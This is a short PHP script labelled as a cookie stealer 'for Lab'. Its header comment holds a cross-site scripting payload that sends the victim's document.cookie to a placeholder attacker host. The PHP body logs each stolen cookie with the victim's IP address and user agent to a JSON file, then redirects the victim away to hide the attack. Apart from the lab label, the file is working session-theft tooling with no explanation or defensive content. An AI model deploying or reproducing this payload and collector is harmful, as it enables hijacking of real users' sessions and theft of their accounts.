<?php
// stealer.php - Modern Cookie Stealer for Lab
// Usage: <script>document.location='http://YOUR_IP/stealer.php?c=' + document.cookie</script>

$log_file = 'captured.json';

if (isset($_GET['c'])) {
    $current_data = [];
    if (file_exists($log_file)) {
        $current_data = json_decode(file_get_contents($log_file), true) ?? [];
    }

    $new_entry = [
        'id' => uniqid(),
        'time' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'],
        'ua' => $_SERVER['HTTP_USER_AGENT'],
        'cookie' => $_GET['c']
    ];

    array_unshift($current_data, $new_entry);
    file_put_contents($log_file, json_encode($current_data, JSON_PRETTY_PRINT));
    
    // Redirect victim back to home to hide the attack
    header("Location: index.php");
    exit;
}
?>
